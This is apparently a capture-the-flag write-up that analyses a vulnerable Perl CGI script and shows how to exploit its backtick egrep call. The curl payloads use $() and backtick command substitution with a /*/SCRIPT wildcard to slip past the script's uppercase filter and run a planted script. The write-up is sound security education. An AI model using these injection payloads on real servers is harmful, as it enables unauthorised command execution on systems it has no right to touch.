in this exercise we got a perl file at the home directory.
The server is listening the localhost:4646 and capturing query parameters x and y.

```perl
    #!/usr/bin/env perl
    # localhost:4646
    use CGI qw{param};
    print "Content-type: text/html\n\n";

    sub t {
      $nn = $_[1];
      $xx = $_[0];
      $xx =~ tr/a-z/A-Z/;
      $xx =~ s/\s.*//;
      @output = `egrep "^$xx" /tmp/xd 2>&1`;
      foreach $line (@output) {
          ($f, $s) = split(/:/, $line);
          if($s =~ $nn) {
              return 1;
          }
      }
      return 0;
    }

    sub n {
      if($_[0] == 1) {
          print("..");
      } else {
          print(".");
      }
    }

    n(t(param("x"), param("y")));
```

Then it perform function t and n

```perl
    sub t {
      $nn = $_[1];                              // asigning param y to "$nn"
      $xx = $_[0];                              // asigning param x to "$xx"
      $xx =~ tr/a-z/A-Z/;                       // tr/ operator is translating the firstlist /a-z/ to the secondlist /A-Z/ (putting character to uppercase)
      $xx =~ s/\s.*//;                          // s/ substitute operator is replacing /\s.*/ by // (simply removing everything after the first space)
      @output = `egrep "^$xx" /tmp/xd 2>&1`;    // backtick are executing `egrep "^$xx" /tmp/xd 2>&1` the ^ means the first match
      foreach $line (@output) {
          ($f, $s) = split(/:/, $line);
          if($s =~ $nn) {
              return 1;
          }
      }
      return 0;
    }
```

The solution ive found to answer all the needs to execute something :
- Need to be only in uppercase
- Need to have no space
- Need to be the first match

We can write a script with uppercase name:
    /tmp/SCRIPT

Give it as argument and use the wildcard /* to test every directory from root
    curl 'http://127.0.0.1:4646?x=/*/SCRIPT'

We finaly need to use the command substitution to execute the command /tmp/SCRIPT :

    curl 'http://127.0.0.1:4646?x=$(/*/SCRIPT)'
                    or
    curl 'http://127.0.0.1:4646?x=`/*/SCRIPT`'
